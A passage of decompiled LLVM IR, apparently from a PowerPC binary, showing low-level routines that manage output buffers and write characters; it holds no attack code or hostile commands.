  store i32 %v0_10006784, i32* %v3_10006784, align 4
  br label %dec_label_pc_10006788

dec_label_pc_10006788:                            ; preds = %dec_label_pc_10006720, %dec_label_pc_1000677c
  %v0_10006788 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10006788, 1
  br i1 %tmp62, label %dec_label_pc_10006864, label %dec_label_pc_10006790

dec_label_pc_10006790:                            ; preds = %dec_label_pc_10006788
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10006794

dec_label_pc_10006794:                            ; preds = %dec_label_pc_1000684c, %dec_label_pc_10006790
  %v0_100067bc = phi i32 [ 0, %dec_label_pc_10006790 ], [ %v1_10006850, %dec_label_pc_1000684c ]
  %v2_10006794 = icmp sgt i32 %v0_100067bc, 2
  br i1 %v2_10006794, label %dec_label_pc_100067b8, label %dec_label_pc_1000679c

dec_label_pc_1000679c:                            ; preds = %dec_label_pc_10006794
  %v1_1000679c = mul i32 %v0_100067bc, 4
  store i32 %v1_1000679c, i32* %r0.global-to-local, align 4
  %v0_100067a0 = load i32, i32* @r1, align 4
  %v2_100067a0 = add i32 %v0_100067a0, %v1_1000679c
  store i32 %v2_100067a0, i32* %r9.global-to-local, align 4
  %v1_100067a4 = add i32 %v2_100067a0, 20
  %v2_100067a4 = inttoptr i32 %v1_100067a4 to i32*
  %v3_100067a4 = load i32, i32* %v2_100067a4, align 4
  store i32 %v3_100067a4, i32* %r0.global-to-local, align 4
  %v1_100067a8 = load i32, i32* @r28, align 4
  %v2_100067a8 = add i32 %v1_100067a8, %v0_100067bc
  store i32 %v2_100067a8, i32* %r9.global-to-local, align 4
  %v1_100067ac = urem i32 %v3_100067a4, 256
  store i32 %v1_100067ac, i32* %r11.global-to-local, align 4
  %v1_100067b0 = trunc i32 %v3_100067a4 to i8
  %v3_100067b0 = add i32 %v2_100067a8, 36
  %v4_100067b0 = inttoptr i32 %v3_100067b0 to i8*
  store i8 %v1_100067b0, i8* %v4_100067b0, align 1
  %v0_100067c4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100067c4

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_10006794
  %v2_100067bc = add i32 %v0_100067bc, %stack_var_-84.3
  store i32 %v2_100067bc, i32* %r9.global-to-local, align 4
  %v1_100067c0 = add i32 %v2_100067bc, -2
  store i32 %v1_100067c0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100067c4

dec_label_pc_100067c4:                            ; preds = %dec_label_pc_1000679c, %dec_label_pc_100067b8
  %v0_100067e4 = phi i32 [ %v0_100067c4.pre, %dec_label_pc_1000679c ], [ %v1_100067c0, %dec_label_pc_100067b8 ]
  %v1_100067c4 = load i32, i32* @r26, align 4
  %v3_100067c4 = icmp sgt i32 %v0_100067e4, %v1_100067c4
  br i1 %v3_100067c4, label %dec_label_pc_100067cc, label %dec_label_pc_100067d8

dec_label_pc_100067cc:                            ; preds = %dec_label_pc_100067c4
  %v2_100067cc = icmp sgt i32 %v0_100067e4, 9
  br i1 %v2_100067cc, label %dec_label_pc_100068c0, label %dec_label_pc_100067d4

dec_label_pc_100067d4:                            ; preds = %dec_label_pc_100067cc
  store i32 %v0_100067e4, i32* @r26, align 4
  br label %dec_label_pc_100067d8

dec_label_pc_100067d8:                            ; preds = %dec_label_pc_100067c4, %dec_label_pc_100067d4
  store i32 %v2_10006474.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100067dc = load i32, i32* @r27, align 4
  %v1_100067dc = mul i32 %v0_100067dc, 4
  store i32 %v1_100067dc, i32* %r0.global-to-local, align 4
  %v2_100067e0 = add i32 %v1_100067dc, %v2_10006474.pre-phi
  %v3_100067e0 = inttoptr i32 %v2_100067e0 to i32*
  %v4_100067e0 = load i32, i32* %v3_100067e0, align 4
  store i32 %v4_100067e0, i32* @r31, align 4
  %v1_100067e4 = add i32 %v0_100067e4, -1
  store i32 %v1_100067e4, i32* @r25, align 4
  %v1_100067e8 = mul i32 %v1_100067e4, 4
  %v3_100067ec = icmp eq i32 %v4_100067e0, 8
  %v1_100067f0 = load i32, i32* @r28, align 4
  %v2_100067f0 = add i32 %v1_100067f0, %v1_100067e8
  store i32 %v2_100067f0, i32* %r9.global-to-local, align 4
  %v1_100067f4 = add i32 %v2_100067f0, 40
  %v2_100067f4 = inttoptr i32 %v1_100067f4 to i32*
  %v3_100067f4 = load i32, i32* %v2_100067f4, align 4
  store i32 %v3_100067f4, i32* %r3.global-to-local, align 4
  br i1 %v3_100067ec, label %dec_label_pc_1000684c, label %dec_label_pc_100067fc

dec_label_pc_100067fc:                            ; preds = %dec_label_pc_100067d8
  %v3_100067fc = icmp eq i32 %v3_100067f4, 8
  br i1 %v3_100067fc, label %dec_label_pc_10006834, label %dec_label_pc_10006804

dec_label_pc_10006804:                            ; preds = %dec_label_pc_100067fc
  %v4_10006804 = icmp eq i32 %v3_100067f4, %v4_100067e0
  br i1 %v4_10006804, label %dec_label_pc_10006834, label %dec_label_pc_1000680c

dec_label_pc_1000680c:                            ; preds = %dec_label_pc_10006804
  %v1_1000680c = call i32 @function_1000637c(i32 %v3_100067f4)
  store i32 %v1_1000680c, i32* @r29, align 4
  %v0_10006814 = load i32, i32* @r31, align 4
  store i32 %v0_10006814, i32* %r3.global-to-local, align 4
  %v1_10006818 = call i32 @function_1000637c(i32 %v0_10006814)
  store i32 %v1_10006818, i32* %r3.global-to-local, align 4
  %v0_10006824 = call i32 @__asm_mfcr()
  store i32 %v0_10006824, i32* %r3.global-to-local, align 4
  store i32 %v0_10006824, i32* %r0.global-to-local, align 4
  %v1_10006828 = call i32 @__asm_rlwinm(i32 %v0_10006824, i32 31, i32 31, i32 31)
  store i32 %v1_10006828, i32* %r0.global-to-local, align 4
  %v3_1000682c = icmp eq i32 %v1_10006828, 0
  br i1 %v3_1000682c, label %dec_label_pc_1000684c, label %dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge

dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge: ; preds = %dec_label_pc_1000680c
  %v0_10006838.pre = load i32, i32* @r27, align 4
  %v0_10006840.pre = load i32, i32* @r25, align 4
  %v1_10006844.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006834

dec_label_pc_10006834:                            ; preds = %dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge, %dec_label_pc_10006804, %dec_label_pc_100067fc
  %v1_10006844 = phi i32 [ %v1_10006844.pre, %dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge ], [ %v1_100067f0, %dec_label_pc_10006804 ], [ %v1_100067f0, %dec_label_pc_100067fc ]
  %v0_10006840 = phi i32 [ %v0_10006840.pre, %dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge ], [ %v1_100067e4, %dec_label_pc_10006804 ], [ %v1_100067e4, %dec_label_pc_100067fc ]
  %v0_10006838 = phi i32 [ %v0_10006838.pre, %dec_label_pc_1000680c.dec_label_pc_10006834_crit_edge ], [ %v0_100067dc, %dec_label_pc_10006804 ], [ %v0_100067dc, %dec_label_pc_100067fc ]
  store i32 %v2_10006474.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10006838 = mul i32 %v0_10006838, 4
  store i32 %v1_10006838, i32* %r0.global-to-local, align 4
  %v2_1000683c = add i32 %v1_10006838, %v2_10006474.pre-phi
  %v3_1000683c = inttoptr i32 %v2_1000683c to i32*
  %v4_1000683c = load i32, i32* %v3_1000683c, align 4
  store i32 %v4_1000683c, i32* %r0.global-to-local, align 4
  %v1_10006840 = mul i32 %v0_10006840, 4
  %v2_10006844 = add i32 %v1_10006840, %v1_10006844
  store i32 %v2_10006844, i32* %r9.global-to-local, align 4
  %v2_10006848 = add i32 %v2_10006844, 40
  %v3_10006848 = inttoptr i32 %v2_10006848 to i32*
  store i32 %v4_1000683c, i32* %v3_10006848, align 4
  br label %dec_label_pc_1000684c

dec_label_pc_1000684c:                            ; preds = %dec_label_pc_1000680c, %dec_label_pc_100067d8, %dec_label_pc_10006834
  %v0_1000684c = load i32, i32* @r28, align 4
  %v1_1000684c = add i32 %v0_1000684c, 28
  %v2_1000684c = inttoptr i32 %v1_1000684c to i32*
  %v3_1000684c = load i32, i32* %v2_1000684c, align 4
  %v0_10006850 = load i32, i32* @r27, align 4
  %v1_10006850 = add i32 %v0_10006850, 1
  store i32 %v1_10006850, i32* @r27, align 4
  %v1_10006854 = add i32 %v3_1000684c, 2
  store i32 %v1_10006854, i32* %r9.global-to-local, align 4
  %v2_10006858 = icmp slt i32 %v1_10006850, %v1_10006854
  br i1 %v2_10006858, label %dec_label_pc_10006794, label %dec_label_pc_1000687c

dec_label_pc_10006864:                            ; preds = %dec_label_pc_10006788
  %v0_10006864 = load i32, i32* @r28, align 4
  %v1_10006864 = add i32 %v0_10006864, 28
  %v2_10006864 = inttoptr i32 %v1_10006864 to i32*
  %v3_10006864 = load i32, i32* %v2_10006864, align 4
  store i32 %v3_10006864, i32* %r5.global-to-local, align 4
  %v1_10006868 = add i32 %v0_10006864, 40
  store i32 %v1_10006868, i32* @r3, align 4
  %v0_1000686c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000686c = trunc i32 %v0_1000686c to i8
  %v3_1000686c = add i32 %v0_10006864, 38
  %v4_1000686c = inttoptr i32 %v3_1000686c to i8*
  store i8 %v1_1000686c, i8* %v4_1000686c, align 1
  %v2_10006870 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10006870, i32* @r4, align 4
  %v0_10006874 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006874 = mul i32 %v0_10006874, 4
  store i32 %v1_10006874, i32* @r5, align 4
  store i32 268462204, i32* @lr, align 4
  %v0_10006878 = call i32 @function_10007108()
  store i32 %v0_10006878, i32* %r3.global-to-local, align 4
  %v0_1000687c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000687c

dec_label_pc_1000687c:                            ; preds = %dec_label_pc_1000684c, %dec_label_pc_10006864
  %v0_1000687c = phi i32 [ %v0_1000687c.pre, %dec_label_pc_10006864 ], [ %v0_1000684c, %dec_label_pc_1000684c ]
  %v1_1000687c = add i32 %v0_1000687c, 16
  %v2_1000687c = inttoptr i32 %v1_1000687c to i32*
  %v3_1000687c = load i32, i32* %v2_1000687c, align 4
  store i32 %v3_1000687c, i32* %r0.global-to-local, align 4
  %v0_10006880 = load i32, i32* @r26, align 4
  %v2_10006880 = add i32 %v0_1000687c, 24
  %v3_10006880 = inttoptr i32 %v2_10006880 to i32*
  store i32 %v0_10006880, i32* %v3_10006880, align 4
  %v0_10006884 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006884 = and i32 %v0_10006884, 128
  store i32 %v1_10006884, i32* %r9.global-to-local, align 4
  %v3_10006884 = icmp eq i32 %v1_10006884, 0
  br i1 %v3_10006884, label %dec_label_pc_1000688c, label %dec_label_pc_10006898

dec_label_pc_1000688c:                            ; preds = %dec_label_pc_1000687c
  %v0_1000688c = load i32, i32* @r30, align 4
  %v1_1000688c = add i32 %v0_1000688c, 1
  store i32 %v1_1000688c, i32* %r0.global-to-local, align 4
  %v1_10006890 = load i32, i32* @r28, align 4
  %v2_10006890 = inttoptr i32 %v1_10006890 to i32*
  store i32 %v1_1000688c, i32* %v2_10006890, align 4
  br label %dec_label_pc_100068b0

dec_label_pc_10006898:                            ; preds = %dec_label_pc_1000687c
  %v2_10006898 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10006898, i32* %r0.global-to-local, align 4
  %v0_1000689c = load i32, i32* @r28, align 4
  %v1_1000689c = inttoptr i32 %v0_1000689c to i32*
  %v2_1000689c = load i32, i32* %v1_1000689c, align 4
  %v1_100068a0 = load i32, i32* @r30, align 4
  %v2_100068a0 = sub i32 %v1_100068a0, %v2_10006898
  %v1_100068a4 = mul i32 %v2_100068a0, 4
  store i32 %v1_100068a4, i32* %r0.global-to-local, align 4
  %v2_100068a8 = add i32 %v1_100068a4, %v2_1000689c
  store i32 %v2_100068a8, i32* %r9.global-to-local, align 4
  store i32 %v2_100068a8, i32* %v1_1000689c, align 4
  br label %dec_label_pc_100068b0

dec_label_pc_100068b0:                            ; preds = %dec_label_pc_1000688c, %dec_label_pc_10006898
  %v0_100068b0 = load i32, i32* @r28, align 4
  %v1_100068b0 = add i32 %v0_100068b0, 28
  %v2_100068b0 = inttoptr i32 %v1_100068b0 to i32*
  %v3_100068b0 = load i32, i32* %v2_100068b0, align 4
  store i32 %v3_100068b0, i32* %r9.global-to-local, align 4
  %v1_100068b4 = add i32 %v3_100068b0, 2
  br label %dec_label_pc_100068c0

dec_label_pc_100068c0:                            ; preds = %dec_label_pc_10006424, %dec_label_pc_100064f8, %dec_label_pc_100065d4, %dec_label_pc_100065c8, %dec_label_pc_100065f0, %dec_label_pc_1000652c, %dec_label_pc_100067cc, %dec_label_pc_1000667c, %dec_label_pc_10006770, %dec_label_pc_100068b0
  %storemerge2 = phi i32 [ %v1_100068b4, %dec_label_pc_100068b0 ], [ -1, %dec_label_pc_10006770 ], [ -1, %dec_label_pc_1000667c ], [ -1, %dec_label_pc_100067cc ], [ -1, %dec_label_pc_1000652c ], [ -1, %dec_label_pc_100065f0 ], [ -1, %dec_label_pc_100065c8 ], [ -1, %dec_label_pc_100065d4 ], [ -1, %dec_label_pc_100064f8 ], [ -1, %dec_label_pc_10006424 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100063bc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100068a4, { 1, 0 }
  uselistorder i32 %v0_1000687c, { 1, 0 }
  uselistorder i32 %v1_10006850, { 1, 2, 0 }
  uselistorder i32 %v1_10006838, { 1, 0 }
  uselistorder i32 %v0_10006824, { 0, 2, 1 }
  uselistorder i32 %v3_100067f4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100067f0, { 1, 2, 0 }
  uselistorder i32 %v1_100067e4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100067dc, { 1, 0 }
  uselistorder i32 %v0_100067dc, { 1, 2, 0 }
  uselistorder i32 %v3_100067a4, { 1, 0, 2 }
  uselistorder i32 %v1_1000679c, { 1, 0 }
  uselistorder i32 %v0_100067bc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10006714, { 1, 2, 0 }
  uselistorder i32 %v1_100066ec, { 2, 1, 0 }
  uselistorder i32 %v1_100066d8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100066bc, { 1, 0, 2 }
  uselistorder i32 %v1_10006688, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006644, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10006608, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100065f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10006564, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10006560, { 1, 0 }
  uselistorder i32 %v0_10006578, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100064dc, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100064d4, { 1, 0 }
  uselistorder i32 %v1_100064c4, { 1, 0 }
  uselistorder i32 %v3_100064bc, { 1, 0, 2 }
  uselistorder i32 %v0_10006538, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10006508, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_10006498, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10006480, { 1, 0 }
  uselistorder i32 %v2_10006474.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10006454, { 1, 0 }
  uselistorder i32 %v1_1000643c, { 1, 2, 0 }
  uselistorder i32 %v0_10006430, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 32, 33, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 44, 45, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32)* @function_1000637c, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000e62c.245 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000e5ec.244 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100068c0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100068b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000687c, { 1, 0 }
  uselistorder label %dec_label_pc_1000684c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100067d8, { 1, 0 }
  uselistorder label %dec_label_pc_100067c4, { 1, 0 }
  uselistorder label %dec_label_pc_10006788, { 1, 0 }
  uselistorder label %dec_label_pc_100066d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000667c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000662c, { 1, 0 }
  uselistorder label %dec_label_pc_10006600, { 1, 0 }
  uselistorder label %dec_label_pc_100065b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100065b0, { 1, 0 }
  uselistorder label %dec_label_pc_10006524, { 1, 0 }
  uselistorder label %dec_label_pc_1000651c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100064bc, { 1, 0 }
  uselistorder label %dec_label_pc_100064b8, { 1, 0 }
  uselistorder label %dec_label_pc_100064a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006484, { 1, 0 }
  uselistorder label %dec_label_pc_10006480, { 1, 0 }
  uselistorder label %dec_label_pc_10006464, { 1, 0 }
}

define i32 @function_100068d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100068d4:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100068dc = call i32 @__asm_mfcr()
  store i32 %v0_100068dc, i32* %r31.global-to-local, align 4
  %v2_10006900 = add i32 %v0_100068dc, 52
  %v3_10006900 = inttoptr i32 %v2_10006900 to i32*
  %v4_10006900 = load i32, i32* %v3_10006900, align 4
  %v2_10006904 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006904, i32* @r3, align 4
  %v3_10006908 = icmp eq i32 %v4_10006900, 0
  store i1 %v3_10006908, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10006908, label %dec_label_pc_1000691c, label %dec_label_pc_1000691c.thread

dec_label_pc_1000691c.thread:                     ; preds = %dec_label_pc_100068d4
  %v1_100069243 = inttoptr i32 %v0_100068dc to i16*
  %v2_100069244 = load i16, i16* %v1_100069243, align 2
  %v3_100069245 = zext i16 %v2_100069244 to i32
  store i32 %v3_100069245, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006930

dec_label_pc_1000691c:                            ; preds = %dec_label_pc_100068d4
  %v0_10006910 = call i32 @function_10009200()
  %v0_10006918 = call i32 @function_100091f8()
  %v0_10006924.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006928.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_10006904, i32* @r3, align 4
  %v1_10006924 = inttoptr i32 %v0_10006924.pre to i16*
  %v2_10006924 = load i16, i16* %v1_10006924, align 2
  %v3_10006924 = zext i16 %v2_10006924 to i32
  store i32 %v3_10006924, i32* %r31.global-to-local, align 4
  br i1 %v0_10006928.pre, label %dec_label_pc_1000692c, label %dec_label_pc_10006930

dec_label_pc_1000692c:                            ; preds = %dec_label_pc_1000691c
  %v0_1000692c = call i32 @function_10009200()
  br label %dec_label_pc_10006930

dec_label_pc_10006930:                            ; preds = %dec_label_pc_1000691c.thread, %dec_label_pc_1000691c, %dec_label_pc_1000692c
  %v3_100069246 = phi i32 [ %v3_100069245, %dec_label_pc_1000691c.thread ], [ %v3_10006924, %dec_label_pc_1000691c ], [ %v3_10006924, %dec_label_pc_1000692c ]
  %v1_10006934 = call i32 @__asm_rlwinm(i32 %v3_100069246, i32 0, i32 29, i32 29)
  %v1_10006944 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100068dc)
  %v9_10006944 = extractvalue %0 %v1_10006944, 7
  store i4 %v9_10006944, i4* @cr4, align 1
  ret i32 %v1_10006934

; uselistorder directives
  uselistorder i32 %v0_100068dc, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10006930, { 2, 1, 0 }
}

define i32 @function_10006950(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006950:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006958 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10006958, i32* %r28.global-to-local, align 4
  %v1_1000697c = add i32 %arg3, 52
  %v2_1000697c = inttoptr i32 %v1_1000697c to i32*
  %v3_1000697c = load i32, i32* %v2_1000697c, align 4
  %v2_10006980 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006980, i32* @r3, align 4
  %v3_1000698c = icmp eq i32 %v3_1000697c, 0
  store i1 %v3_1000698c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000698c, label %dec_label_pc_10006994, label %dec_label_pc_100069a0

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006950
  %v0_10006994 = call i32 @function_10009200()
  %v0_1000699c = call i32 @function_100091f8()
  %v0_100069a0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100069a4.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100069a8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100069a0

dec_label_pc_100069a0:                            ; preds = %dec_label_pc_10006950, %dec_label_pc_10006994
  %v0_100069a8 = phi i32 [ %v0_10006958, %dec_label_pc_10006950 ], [ %v0_100069a8.pre, %dec_label_pc_10006994 ]
  %v0_100069a4 = phi i32 [ %arg3, %dec_label_pc_10006950 ], [ %v0_100069a4.pre, %dec_label_pc_10006994 ]
  %v0_100069a0 = phi i32 [ %arg2, %dec_label_pc_10006950 ], [ %v0_100069a0.pre, %dec_label_pc_10006994 ]
  store i32 268462512, i32* @lr, align 4
  %v3_100069ac = inttoptr i32 %v0_100069a8 to i8*
  %v4_100069ac = call i32 @function_10006e0c(i8* %v3_100069ac, i32 %v0_100069a0, i32 %v0_100069a4)
  store i32 %v4_100069ac, i32* @r31, align 4
  store i32 %v2_10006980, i32* @r3, align 4
  %v0_100069bc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100069bc, label %dec_label_pc_100069c0, label %dec_label_pc_100069c4

dec_label_pc_100069c0:                            ; preds = %dec_label_pc_100069a0
  %v0_100069c0 = call i32 @function_10009200()
  %v0_100069c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100069c4

dec_label_pc_100069c4:                            ; preds = %dec_label_pc_100069a0, %dec_label_pc_100069c0
  %v0_100069c8 = phi i32 [ %v4_100069ac, %dec_label_pc_100069a0 ], [ %v0_100069c8.pre, %dec_label_pc_100069c0 ]
  %v1_100069d8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006958)
  %v9_100069d8 = extractvalue %0 %v1_100069d8, 7
  store i4 %v9_100069d8, i4* @cr4, align 1
  ret i32 %v0_100069c8

; uselistorder directives
  uselistorder i32 %v0_10006958, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100069c4, { 1, 0 }
  uselistorder label %dec_label_pc_100069a0, { 1, 0 }
}

define i32 @function_100069e4(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100069e4:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_100069f0 = add i32 %arg2, 56
  store i32 %v1_100069f0, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v1_10006a04 = add i32 %arg2, 52
  %v2_10006a04 = inttoptr i32 %v1_10006a04 to i32*
  %v3_10006a04 = load i32, i32* %v2_10006a04, align 4
  %v3_10006a08 = icmp eq i32 %v3_10006a04, 0
  br i1 %v3_10006a08, label %dec_label_pc_10006a40, label %dec_label_pc_10006a10

dec_label_pc_10006a10:                            ; preds = %dec_label_pc_100069e4
  %v1_10006a10 = add i32 %arg2, 16
  %v2_10006a10 = inttoptr i32 %v1_10006a10 to i32*
  %v3_10006a10 = load i32, i32* %v2_10006a10, align 4
  %v1_10006a141 = zext i8 %arg1 to i32
  store i32 %v1_10006a141, i32* %r30.global-to-local, align 4
  %v1_10006a18 = add i32 %arg2, 28
  %v2_10006a18 = inttoptr i32 %v1_10006a18 to i32*
  %v3_10006a18 = load i32, i32* %v2_10006a18, align 4
  %v2_10006a1c = add i32 %v3_10006a10, 1
  store i32 %v2_10006a1c, i32* %r11.global-to-local, align 4
  %v3_10006a20 = icmp ult i32 %v3_10006a10, %v3_10006a18
  br i1 %v3_10006a20, label %dec_label_pc_10006a28, label %dec_label_pc_10006a34

dec_label_pc_10006a28:                            ; preds = %dec_label_pc_10006a10
  %v4_10006a10 = inttoptr i32 %v3_10006a10 to i8*
  store i8 %arg1, i8* %v4_10006a10, align 1
  %v0_10006a2c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10006a2c, i32* %v2_10006a10, align 4
  br label %dec_label_pc_10006a98

dec_label_pc_10006a34:                            ; preds = %dec_label_pc_10006a10
  store i32 268462648, i32* @lr, align 4
  %v4_10006a34 = trunc i32 %v1_100069f0 to i8
  %v5_10006a34 = call i32 @function_10006ed0(i8 %v4_10006a34, i32 %v3_10006a10, i32 %v1_100069f0)
  store i32 %v5_10006a34, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006a98

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_100069e4
  %v2_10006a44 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006a44, i32* @r3, align 4
  %v0_10006a4c = call i32 @function_10009200()
  %v0_10006a54 = call i32 @function_100091f8()
  %v0_10006a58 = load i32, i32* @r31, align 4
  %v1_10006a58 = add i32 %v0_10006a58, 16
  %v2_10006a58 = inttoptr i32 %v1_10006a58 to i32*
  %v3_10006a58 = load i32, i32* %v2_10006a58, align 4
  %v1_10006a5c = add i32 %v0_10006a58, 28
  %v2_10006a5c = inttoptr i32 %v1_10006a5c to i32*
  %v3_10006a5c = load i32, i32* %v2_10006a5c, align 4
  %v2_10006a64 = add i32 %v3_10006a58, 1
  store i32 %v2_10006a64, i32* %r11.global-to-local, align 4
  %v0_10006a68 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006a68 = urem i32 %v0_10006a68, 256
  store i32 %v1_10006a68, i32* %r30.global-to-local, align 4
  %v3_10006a6c = icmp ult i32 %v3_10006a58, %v3_10006a5c
  br i1 %v3_10006a6c, label %dec_label_pc_10006a78, label %dec_label_pc_10006a84

dec_label_pc_10006a78:                            ; preds = %dec_label_pc_10006a40
  %v4_10006a58 = inttoptr i32 %v3_10006a58 to i8*
  %v1_10006a78 = trunc i32 %v0_10006a68 to i8
  store i8 %v1_10006a78, i8* %v4_10006a58, align 1
  %v0_10006a7c = load i32, i32* %r11.global-to-local, align 4
  %v1_10006a7c = load i32, i32* @r31, align 4
  %v2_10006a7c = add i32 %v1_10006a7c, 16
  %v3_10006a7c = inttoptr i32 %v2_10006a7c to i32*
  store i32 %v0_10006a7c, i32* %v3_10006a7c, align 4
  br label %dec_label_pc_10006a8c

dec_label_pc_10006a84:                            ; preds = %dec_label_pc_10006a40
  %v1_10006a70 = trunc i32 %v0_10006a68 to i8
  store i32 268462728, i32* @lr, align 4
  %v6_10006a84 = call i32 @function_10006ed0(i8 %v1_10006a70, i32 %v0_10006a58, i32 %v3_10006a58)
  store i32 %v6_10006a84, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006a8c

dec_label_pc_10006a8c:                            ; preds = %dec_label_pc_10006a78, %dec_label_pc_10006a84
  store i32 %v2_10006a44, i32* @r3, align 4
  %v0_10006a94 = call i32 @function_10009200()
  br label %dec_label_pc_10006a98

dec_label_pc_10006a98:                            ; preds = %dec_label_pc_10006a34, %dec_label_pc_10006a28, %dec_label_pc_10006a8c
